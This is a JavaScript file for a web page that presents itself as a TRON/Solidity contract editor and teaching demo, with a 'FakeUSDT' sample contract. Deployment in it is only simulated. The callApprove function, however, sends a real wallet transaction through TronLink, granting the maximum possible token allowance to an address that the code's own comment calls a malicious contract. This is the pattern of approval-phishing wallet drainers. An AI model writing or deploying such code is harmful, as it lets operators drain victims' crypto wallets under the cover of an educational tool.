let editor;
let currentFile = 'MyContract.sol';

require.config({ paths: { vs: 'https://unpkg.com/monaco-editor@0.34.1/min/vs' } });
require(['vs/editor/editor.main'], function () {
  editor = monaco.editor.create(document.getElementById('editor'), {
    value: `// 合约代码示例\ncontract MyContract {\n    function hello() public {}\n}`,
    language: 'sol',
    theme: 'vs-dark'
  });
});

function selectFile(filename) {
  currentFile = filename;
  document.querySelectorAll('#fileList li').forEach(li => li.classList.remove('active'));
  event.target.classList.add('active');

  const content = filename === 'FakeUSDT.sol'
    ? `// 假USDT合约\ncontract FakeUSDT {\n    function approve(address spender, uint amount) public {}\n}`
    : `// 合约代码示例\ncontract MyContract {\n    function hello() public {}\n}`;

  editor.setValue(content);
}

let tronWeb;

document.getElementById('connectBtn').onclick = async () => {
  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    tronWeb = window.tronWeb;
    log('✅ 钱包已连接：' + tronWeb.defaultAddress.base58);
  } else {
    log('❌ 请先打开 TronLink 插件');
  }
};

function log(msg) {
  const logEl = document.getElementById('log');
  logEl.textContent = msg;
}

function deployContract() {
  log('🚀 模拟部署中...');
  setTimeout(() => {
    log('✅ 模拟部署成功（教学演示用）');
  }, 1000);
}

async function callApprove() {
  if (!tronWeb) {
    log('❌ 请先连接钱包');
    return;
  }

  const contractAddress = 'TDGU4LtaZ6mgGSY997dgkrPvbav6CEi6VX'; // 恶意合约地址
  const spender = contractAddress;
  const amount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

  try {
    const contract = await tronWeb.contract().at(contractAddress);
    await contract.approve(spender, amount).send();
    log('✅ 授权已发起（approve）');
  } catch (e) {
    console.error(e);
    log('❌ 授权失败');
  }
}
